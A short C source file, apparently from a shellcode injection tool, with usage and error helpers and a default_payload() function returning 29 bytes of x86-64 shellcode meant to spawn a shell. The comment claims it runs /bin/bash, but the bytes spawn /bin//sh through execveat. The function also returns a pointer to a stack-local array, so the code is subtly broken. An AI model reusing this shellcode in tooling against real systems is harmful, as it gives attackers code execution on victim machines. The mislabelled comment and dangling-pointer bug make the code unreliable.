#include "helpers.h"
#include "includes.hpp"
#include "definitions.h"

void usage(char *progname, int opt) {
   fprintf(stderr, USAGE_FMT, progname?progname:DEFAULT_PROGNAME);
   exit(EXIT_FAILURE);
}

void error(const char *str ){
  fprintf(stderr, "\x1b[1;37m[ERROR]\x1b[0m %s ", str);
  exit(EXIT_FAILURE);
}

void error_verbose(const char *str, char *progname){
  fprintf(stderr, "\x1b[1;37m[ERROR]\x1b[0m %s ", str);
  fprintf(stderr, USAGE_FMT, progname?progname:DEFAULT_PROGNAME);
  exit(EXIT_FAILURE);
}


char* default_payload(){

  	// Shellcode to run /bin/bash
	char payload[] = \
    "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf"
    "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54"
    "\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05";

  	return payload;
}


int default_payload_size(){
	return 29;
}
